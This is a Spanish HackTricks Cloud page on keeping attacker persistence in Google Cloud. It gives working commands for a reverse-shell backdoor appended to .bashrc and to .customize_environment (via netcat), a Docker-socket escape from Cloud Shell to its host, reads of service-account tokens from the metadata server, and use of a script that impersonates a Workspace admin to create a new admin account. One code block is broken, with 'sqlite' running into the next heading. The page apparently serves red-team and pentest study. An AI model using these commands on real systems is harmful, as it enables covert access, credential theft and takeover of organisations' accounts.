# GCP - Persistencia no-svc

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Estas son t√©cnicas √∫tiles una vez que, de alguna manera, se han comprometido algunas credenciales de GCP o una m√°quina que se ejecuta en un entorno de GCP.

## Google‚Äôs Cloud Shell <a href="#e5eb" id="e5eb"></a>

### Backdoor Persistente

[**Google Cloud Shell**](https://cloud.google.com/shell/) te proporciona acceso a la l√≠nea de comandos a tus recursos en la nube directamente desde tu navegador sin ning√∫n costo asociado.

Puedes acceder a la Google Cloud Shell desde la **consola web** o ejecutando **`gcloud cloud-shell ssh`**.

Esta consola tiene algunas capacidades interesantes para los atacantes:

1. **Cualquier usuario de Google con acceso a Google Cloud** tiene acceso a una instancia de Cloud Shell completamente autenticada.
2. Dicha instancia **mantendr√° su directorio principal durante al menos 120 d√≠as** si no hay actividad.
3. No hay **capacidades para que una organizaci√≥n supervise** la actividad de esa instancia.

Esto b√°sicamente significa que un atacante puede poner una puerta trasera en el directorio principal del usuario y siempre que el usuario se conecte a GC Shell cada 120 d√≠as al menos, la puerta trasera sobrevivir√° y el atacante obtendr√° una shell cada vez que se ejecute solo haciendo:

```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```

Hay otro archivo en la carpeta principal llamado **`.customize_environment`** que, si existe, se ejecutar√° **cada vez que el usuario acceda a la shell en la nube** (como en la t√©cnica anterior). Simplemente inserta la puerta trasera anterior o una como la siguiente para mantener la persistencia siempre que el usuario use "frecuentemente" la shell en la nube:

```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```

{% hint style="warning" %}
Ten en cuenta que **la primera vez que se realiza una acci√≥n en Cloud Shell que requiere autenticaci√≥n**, aparece una ventana de autorizaci√≥n en el navegador del usuario que debe aceptarse antes de que se ejecute el comando. Si aparece una ventana emergente inesperada, el objetivo podr√≠a sospechar y quemar el m√©todo de persistencia.
{% endhint %}

### Escape de contenedor de Google Cloud Shell

Ten en cuenta que Google Cloud Shell se ejecuta dentro de un contenedor, puedes **escapar f√°cilmente al host** haciendo:

```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```

Esto no es considerado una vulnerabilidad por Google, pero te da una visi√≥n m√°s amplia de lo que est√° sucediendo en ese entorno.

Adem√°s, ten en cuenta que desde el host puedes encontrar un token de cuenta de servicio:

```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```

Con los siguientes alcances:

```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```

## Secuestro de token

### Usuario autenticado

Si logras acceder a la carpeta principal de un **usuario autenticado en GCP**, por **defecto**, podr√°s **obtener tokens para ese usuario siempre que quieras** sin necesidad de autenticarte e independientemente de la m√°quina que uses sus tokens y aunque el usuario tenga MFA configurado.

Esto se debe a que, por defecto, **podr√°s usar el token de actualizaci√≥n siempre** que quieras para generar nuevos tokens.

Para obtener el token actual de un usuario, puedes ejecutar:

```bash
sqlite
## Propagaci√≥n a Workspace a trav√©s de la delegaci√≥n de autoridad en todo el dominio <a href="#spreading-to-g-suite-via-domain-wide-delegation-of-authority" id="spreading-to-g-suite-via-domain-wide-delegation-of-authority"></a>

[**Workspace**](https://gsuite.google.com) es la plataforma de colaboraci√≥n y productividad de Google que consta de cosas como Gmail, Google Calendar, Google Drive, Google Docs, etc.

Las **cuentas de servicio** en GCP pueden recibir los **derechos para acceder program√°ticamente a los datos de los usuarios** en Workspace mediante la suplantaci√≥n de usuarios leg√≠timos. Esto se conoce como [delegaci√≥n en todo el dominio](https://developers.google.com/admin-sdk/reports/v1/guides/delegation). Esto incluye acciones como **leer** **correo electr√≥nico** en GMail, acceder a Google Docs e incluso crear nuevas cuentas de usuario en la organizaci√≥n de G Suite.

Workspace tiene [su propia API](https://developers.google.com/gsuite/aspects/apis), completamente separada de GCP. Los permisos se otorgan a Workspace y **no hay ninguna relaci√≥n predeterminada entre GCP y Workspace**.

Sin embargo, es posible **darle** a una cuenta de servicio **permisos** sobre un usuario de Workspace. Si tiene acceso a la interfaz de usuario web en este punto, puede navegar a **IAM -> Cuentas de servicio** y ver si alguna de las cuentas tienen **"Habilitado" en la columna "delegaci√≥n en todo el dominio"**. La columna en s√≠ puede **no aparecer si no hay cuentas habilitadas** (puede leer los detalles de cada cuenta de servicio para confirmar esto). A partir de esta escritura, no hay forma de hacer esto program√°ticamente, aunque hay una [solicitud de esta funci√≥n](https://issuetracker.google.com/issues/116182848) en el rastreador de errores de Google.

Para crear esta relaci√≥n, es necesario **habilitarla en GCP y tambi√©n en Workforce**.

#### Prueba de acceso a Workspace

Para probar este acceso, necesitar√° las **credenciales de la cuenta de servicio exportadas en formato JSON**. Es posible que haya adquirido estas en un paso anterior, o puede tener el acceso necesario ahora para crear una clave para una cuenta de servicio que sabe que tiene habilitada la delegaci√≥n en todo el dominio.

Este tema es un poco complicado... su cuenta de servicio tiene algo llamado "client\_email" que puede ver en el archivo de credenciales JSON que exporta. Probablemente se vea algo como `account-name@project-name.iam.gserviceaccount.com`. Si intenta acceder a las llamadas de API de Workforce directamente con ese correo electr√≥nico, incluso con la delegaci√≥n habilitada, fallar√°. Esto se debe a que el directorio de Workforce no incluir√° las direcciones de correo electr√≥nico de las cuentas de correo electr√≥nico de la cuenta de servicio de GCP. En cambio, para interactuar con Workforce, necesitamos suplantar a usuarios v√°lidos de Workforce.

Lo que realmente desea hacer es **suplantar a un usuario con acceso administrativo**, y luego usar ese acceso para hacer algo como **restablecer una contrase√±a, desactivar la autenticaci√≥n multifactor o simplemente crear una nueva cuenta de administrador brillante**.

Gitlab ha creado [este script de Python](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp\_misc/blob/master/gcp\_delegation.py) que puede hacer dos cosas: listar el directorio de usuarios y crear una nueva cuenta administrativa. As√≠ es como lo usar√≠a:

```bash
# Validar solo el acceso
./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com

# Listar el directorio
./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com \
    --list

# Crear una nueva cuenta de administrador
./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com \
    --account pwned
```

Puede probar este script en una variedad de direcciones de correo electr√≥nico para suplantar a **varios usuarios**. La salida est√°ndar indicar√° si la cuenta de servicio tiene acceso a Workforce y proporcionar√° una **contrase√±a aleatoria para la nueva cuenta de administrador** si se crea una.

Si tiene √©xito al crear una nueva cuenta de administrador, puede iniciar sesi√≥n en la [consola de administraci√≥n de Google](https://admin.google.com) y tener control total sobre todo en G Suite para cada usuario: correo electr√≥nico, documentos, calendario, etc. Divi√©rtete.

## Referencias

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si desea ver su **empresa anunciada en HackTricks** o si desea acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulte los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obtenga el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>